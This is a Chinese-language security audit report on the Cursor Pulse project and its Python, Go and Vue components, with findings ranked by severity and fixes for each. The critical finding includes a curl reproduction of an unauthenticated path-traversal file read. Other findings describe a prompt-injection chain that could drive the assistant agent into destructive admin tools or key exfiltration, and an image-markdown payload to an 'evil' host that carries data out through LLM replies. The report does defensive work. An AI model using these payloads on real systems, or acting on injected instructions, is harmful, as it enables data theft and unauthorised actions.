# Cursor Pulse 全项目审计报告（2026-09-29）

**范围**：`pulse`（约 3.7 万行）、`assistant_platform`（约 1.6 万行）、`proxy`（Go，约 1 万行）、`web-admin`（约 1.7 万行）、`docker/` 与 CI，以及线上开发机的日志和数据库状态。
**方法**：按安全、Go 代理、Assistant、Pulse 核心、前端与运维五个方向分别做静态审查，结合自动检查与线上日志和数据分析。报告中的高危及以上问题都已在代码或线上逐条复核。“需确认”表示只做了静态推断，未能实证。

**自动检查结果**

| 检查 | 结果 |
|------|------|
| `pytest -n auto`（Python 全量） | 1314 passed，16 skipped |
| `go vet ./...` / `go test -race ./...` | 通过，未发现数据竞争 |
| `vue-tsc --noEmit` / `npm run build` | 通过；主包 `index-*.js` 约 1.25 MB（gzip 404 KB），图表 chunk 约 602 KB |
| 已提交密钥扫描 | 未发现真实密钥（仅文档中的 `crsr_xxx` 占位符） |
| `npm audit` / `pip-audit` | 无法执行（registry 403 / 无外网），依赖漏洞**未覆盖** |
| ruff | 本机未安装且无法联网安装；CI 中有运行 |

---

## 一、需要立即处理（紧急）

### C1. 无需登录即可读取服务器上的任意文件 🔴 严重（已在线上复现；**代码已修复，密钥待轮换**）

- **位置**：`pulse/web/app.py:380-387`（`/admin/{full_path:path}`）
- **问题**：代码只过滤了 `..` 路径段。如果 `full_path` 是绝对路径，`resolved / "/etc/x"` 会直接得到 `/etc/x`。
- **复现**：`curl http://127.0.0.1:8080/admin//etc/hostname`，以及编码后的 `/admin/%2Fetc%2Fhostname`，都返回 **200 和文件内容**。服务监听在 `0.0.0.0:8080`。
- **影响**：攻击者可以读取 `config.yaml`、`.env`、`/proc/self/environ`（其中有 JWT 密钥、凭证加密密钥、内部 token）以及 `data/pulse.db`，进而伪造 owner 的 JWT、解密全部 Cursor Key、冒充内部服务。
- **修复**：
  1. 解析路径后校验它仍在静态目录内：`candidate = (resolved / full_path).resolve()`，然后 `candidate.is_relative_to(resolved)`。
  2. 补一个回归测试，覆盖 `//etc/...` 和 `%2F` 两种写法。
  3. 修复后**轮换**：`JWT_SECRET`、内部 service token、`ASSISTANT_SECRET_KEY`。凭证加密密钥和各类 API Key 视暴露时长评估是否一并轮换。

---

## 二、高危

| # | 领域 | 位置 | 问题 | 建议 |
|---|------|------|------|------|
| H1 | 权限 | `pulse/web/settings_api.py:41-49` | 查看密钥明文的接口只要求 `settings:read`，而**审计员、运营员**都有这个权限，因此能看到钉钉/飞书 `app_secret`、LLM、web_search、Jev 的 `api_key` 明文 | **已修复**：改为要求 `settings:write`（仅 owner） |
| H2 | Agent 安全 | `assistant_platform/conversation/agent_runtime.py:432` | 工具调用把 `confirmed=True` 写死，执行器里 `confirmation_required` 的检查因此失效。能力里有破坏性操作（`key.loan.revoke`、`ingestion.reject`、`cursor.key.unbind`、`guide_image.update`），也有 `web.fetch` 和成员可写的知识库，构成“提示注入 → 以管理员身份执行破坏性操作 / 带出 Key”的链路。按角色的权限校验仍然有效 | 高风险能力改为服务端两段式确认（先返回待确认，用户下一条消息明确确认后再执行）；同一回合调用过 `web.fetch` 后，禁止再调用敏感工具 |
| H3 | 代理 | `proxy/mitm.go`、`session_token.go` | **已修复**：换票改为下发代理签发的替身 JWT（声明与上游类似，但不含 `apiKeyId`，签名为本进程密钥）。真实 Cursor accessToken 只留在代理内存；业务请求与 `/auth/*` 在 MITM 时换成上游 JWT。`PROXY_OPAQUE_SESSION_TOKEN` 默认开启，设为 `off` 可回退。**修复前实证**：`pka_` 换票后直连 `ListUserApiKeys` 返回 200；**修复后实证**：同一路径直连返回 401。客户端兼容性仍建议在 Cursor IDE / `cursor-agent` 上做一次冒烟 | 已实现；建议冒烟后视情况轮换曾暴露过的 `pka_` |
| H4 | 代理 | `proxy/openai_gateway.go` | **已修复**：`MaxBytesReader` + `PROXY_MAX_BODY`，超限 413 | 已实现 |
| H5 | 代理 | `proxy/main.go` | **已修复**：根 `http.Server` 设置 `ReadHeaderTimeout`/`IdleTimeout` | 已实现 |
| H6 | 代理 | `proxy/pulse_client.go` | **已修复**：失败批次前置回缓冲（`usageBufMax` 默认 2000，溢出丢最新）；非 force 刷新失败后短暂退避，避免宕机时 tight-loop | 已实现 |
| H7 | 代理 | `proxy/pulse_client.go:187-238` | （需确认）共享池 `pk_` 的鉴权结果最多缓存 60 秒，吊销或暂停后这段时间内仍能换票 | 缩短缓存时间；Pulse 返回 403 时清掉缓存 |
| H8 | Assistant | `assistant_platform/config.py:74` | `agent_total_timeout_seconds` **只在配置里定义，运行时从不读取**，一次对话没有总时长上限 | 在 `AgentRuntime.run` 里按开始时间检查，超时就中止 |
| H9 | Assistant | `assistant_platform/jobs/worker.py` | **已修复**：非 `sent`/`skipped` 时抛错并走失败重试 | 已实现 |
| H10 | Assistant | `jobs/worker.py` + `turn_recovery.py` | **已修复**：执行中约每 30 s 心跳刷新 `updated_at`；90 s 超时相对上次心跳，健康长对话不再被误重跑 | 已实现 |
| H11 | 运维 | 线上 `pulse web`、`assistant serve`、`pulse channel` 都带 `--reload` | 生产用的是开发模式：日志中两个服务各有**约 1000 次**自动重启，其中 9 月 29 日 08:59 就有一次在流式回复进行中被重启 | 生产环境去掉 `--reload`，用 systemd 或 docker compose 托管 |

---

## 三、中危

### 安全
- **OAuth 登录 CSRF**：`web-admin/src/views/LoginCallbackView.vue:33` 的判断条件是 `saved && state && saved !== state`，只要缺一个就直接放行；后端回调也不校验 state。建议由服务端签发和校验 state。
- **跨渠道身份混淆**：`pulse/web/portal.py:103-105`。钉钉 OAuth 在本渠道找不到人时，会退回按 `web` 渠道的用户名匹配（钉钉 userid 能否设成 `admin` 这类值需确认）。建议只按本渠道身份匹配。
- **内部 token 泄露的影响面**：一个 token 同时供 Proxy 和 Assistant 使用，可以冒充任意成员（`actor_member_id` 由调用方填写），`/proxy/pool` 还会返回池凭证明文。建议两个服务分用不同 token，并限定各自能访问的路由。
- **团队设置里的密钥明文落库**：`pulse/settings/team_store.py:144-155`。建议复用 `encrypt_secret` 加密存储。
- **登录限流可被用来锁号**：`pulse/web/login_throttle.py`，按用户名计数，登录成功也不清零。建议只对失败计数、成功后清零，并改为指数退避。
- **Token 存在 localStorage**：`web-admin/src/utils/authSession.ts`，前端一旦有 XSS 就能被直接读走；同时站点没有 CSP 等安全响应头。

### 正确性与可靠性
- **用量按 UTC 划分日期和月份**：`pulse/integrations/cursor_api.py:113`、`pulse/ingestion/sync.py:203`。北京时间 0–8 点的用量会记到前一天，每月 1 号 0–8 点的用量会记到上个月。建议按团队时区计算日期，并补边界测试。
- **首页“同步状态”区块间歇性报错**：`pulse/tool_center/ingestion_status.py:60` 把不带时区的 `last_sync_at` 和带时区的当前时间直接比较，抛 `TypeError`（`web.log` 里反复出现）。建议统一先转成带时区的时间（仓库里已有 `_utc_aware` 辅助函数）。
- **凭证失效后仍被反复同步**：`pulse/ingestion/sync_schedule.py:71-74`。遇到 401/403 这类不可恢复的错误时，没有把下次同步时间往后推，每次定时任务都会重试。建议设置较长的冷却时间或暂停同步，并通知管理员。
- **会话归档（长期记忆）一直失败**：embedding 接口 `http://101.132.237.21:8080/v1/embeddings` 返回 **404**，日志里累计 231 次。这导致 `session.close` 任务失败，已有 4 个会话归档处于 failed 状态。建议修正 embedding 的 base_url 或模型配置，或者在接口不可用时跳过向量化这一步。
- **`ap_outbox_events` 只增不减**：写入后状态永远是 `pending`，也没有任何消费者（目前约 600 条）。建议要么真正消费它，要么删掉这张表、只保留 job。
- **防重复调度的查询状态写错**：`assistant_platform/conversation/turn_inbox.py:124` 查的是 `"queued"`，任务的实际状态值是 `"pending"`，这个检查不起作用。
- **后台任务失败原因没有落库**：`ap_background_jobs` 表没有错误字段，排查只能去翻日志。
- **记忆退出（opt-out）只拦新的归档**：`memory/agent_tools.py` 仍然能检索退出前的历史记忆（需确认）。
- **Connect 流式重放缓存没有上限**（`proxy/frames.go:25-36`）；**会话表只增不删**（`proxy/session.go:45-74`）。
- **每次同步都重算所有账期的汇总**：`pulse/ingestion/sync.py:241`。建议只重算本次涉及的月份。
- **缺少热点查询索引**：`usage_records` 在按 `event_date` 范围查询、再联表 `usage_ingestions.account_id` 时没有复合索引（目前 5.5 万行，还在增长）。
- **SQLite 外键约束没开**：`pulse/storage/db.py:33`。

### 运维与工程
- **敏感文件权限过宽**：数据库文件是 `rw-rw-rw-`（`docker/data/*.db`），同一台机器上的任何用户都能读写。建议改成 `600`。
- **日志没有轮转**：`.dev/logs/proxy.log` 已有 **485 MB**，`channel.log` 44 MB。另外 `httpx` 的 INFO 级别日志会把每次请求都记一行，流式回复时每 0.3 秒一行。建议加上轮转，并把 `httpx` 的日志级别调到 WARNING。
- **`.gitignore` 有漏洞**：根目录的 `data.scratch-bak-*`、`data.local-empty-*`（里面有数据库）没有被忽略，容易被误提交。建议加 `data*/` 规则。
- **Docker 镜像用 root 运行**：`docker/Dockerfile` 里没有 `USER`；`channel` 服务也没有健康检查。
- **CI 覆盖不全**：没有 `go vet` 和 `-race`。另外本地和 CI 用 Python 3.12，Docker 用 3.11，版本不一致。
- **依赖没有锁定版本**：`pyproject.toml` 全是 `>=`，没有 lock 文件。
- **`config.example.yaml` 与实际配置脱节**：缺 `llm`、`jev`、`assistant_llm`、`memory`、`proxy`、`web_search` 等配置段。
- **前端包体偏大**：Element Plus 和全部图标是全量注册的，主包约 1.25 MB。建议按需引入，把 ECharts 拆出来懒加载。

---

## 四、低危与代码卫生

- `pulse/web/deps.py:24`：ADMIN_WEB_TOKEN 用 `!=` 比较，不是常量时间比较；生产环境也没有禁用这个灾备入口。
- PBKDF2 只有 12 万次迭代（`pulse/web/passwords.py:10`），低于 OWASP 建议；修改密码后也不会吊销已有的 refresh token。
- DOMPurify 默认允许外链 `<img>`，LLM 回复里的 `![](https://evil/?d=...)` 可以把数据带出去。建议在聊天渲染时禁止外链图片。
- 钉钉 OAuth 出错时把上游原文返回给前端（`pulse/web/dingtalk_oauth.py:122-151`）。
- 旧版 `DASHBOARD_HTML` 用 `innerHTML` 拼接 `account_identifier`（`pulse/web/app.py:432-438`）。
- 没配 `ASSISTANT_SECRET_KEY` 时，Secret Store 会回退用 service token 作加密密钥（`assistant_platform/secrets/store.py:53-60`）。
- `admin.channel_user_ids 未配置` 这条提示以 ERROR 级别打了 596 次，属于日志噪声。
- `PROXY_CONNECT_ALLOWLIST` 里写 `*` 会放行任意主机（`proxy/allowlist.go:56`）。
- 前端路由上的会话账本只认 `read:self`，而菜单对 `read:all` 也显示。只有“只勾了 `read:all` 的自定义角色”会受影响。
- 权限变更后前端不会刷新（`fetchMe()` 不在路由守卫里调用），要重新登录才生效。
- 遗留配置项 `memory_database_url`、`memory_enabled` 仍然保留，容易误导运维。
- **超大文件**：`LoansView.vue` 1383 行、`SettingsView.vue` 1307 行、`CpOpenAiGatewayPanel.vue` 1139 行、`SessionsView.vue` 1079 行、`pulse/storage/migrate.py` 1032 行、`key_loan_issue.py` 821 行、`quota_api.py` 800 行、`proxy/mitm.go` 760 行、`orchestrator.py` 约 650 行。

---

## 五、做得好的地方

- 内部 API 在未配置 token 时直接失败（返回 503），token 比较用 `hmac.compare_digest`；启动时会拒绝占位 token，生产环境强制 JWT 密钥至少 32 字节。
- Refresh token 只存哈希，轮换时加行锁、能识别重复使用；每次请求都从数据库重新解析权限，禁用或降级立即生效。
- 凭证用 AES-GCM 加密；reveal 操作有审计记录；借用、凭证、Proxy Key 的 reveal 接口都做了属主校验，没有发现越权读取。
- `web.fetch` 的 SSRF 防护很完整：协议白名单、DNS 解析后逐跳校验内网地址、固定解析结果防 DNS rebinding、限制响应大小和重定向次数。
- 数据库访问全部走 ORM；Markdown 渲染经过 DOMPurify 过滤。
- 用量同步采用“同账期整体替换”，正常重复同步不会重复计数，并有测试覆盖。
- Go 代理通过了竞态检测；会话每 120 秒向 Pulse 重新鉴权，失败时拒绝放行；日志里的 Key 都做了脱敏。
- 测试规模很大（Python 1314 个用例，Go 测试也比较全），CI 覆盖了 lint、Python 测试、Go 测试和前端构建。

---

## 六、建议的处理顺序

1. **今天**：修复 C1 并**轮换密钥**；H1 改为要求 owner 权限；生产去掉 `--reload`（H11）；数据库文件权限改为 600。
2. **本周**：H4、H5（代理超时与请求体限制）；H9（`reply.send` 失败重试）；修正 embedding 配置；修复首页同步状态的时区报错；`.gitignore` 和日志轮转。
3. **两周内**：H2（高风险工具两段式确认）；H3（代理不再下发真实 JWT）；H6、H7；H8、H10；用量的时区归属；凭证失效后的同步冷却；OAuth state 校验。
4. **持续改进**：拆分内部 token；团队设置里的密钥加密；前端 token 存储方式与 CSP；包体拆分；超大模块拆分；锁定依赖版本；CI 加 `go vet` 和 `-race`；补上依赖漏洞扫描。
